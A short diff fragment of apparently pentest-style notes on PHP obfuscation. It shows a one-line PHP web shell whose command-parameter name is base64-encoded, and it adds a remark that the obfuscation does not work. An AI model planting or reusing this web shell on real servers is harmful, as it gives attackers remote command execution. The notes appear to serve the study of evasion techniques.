@@ -7,3 +7,5 @@ https://www.gaijin.at/en/tools/php-obfuscator
 <?php system($_GET[base64_decode('Y21k')]);?>
 ```
 
+
+As i was going through this Php obfuscation won't work 
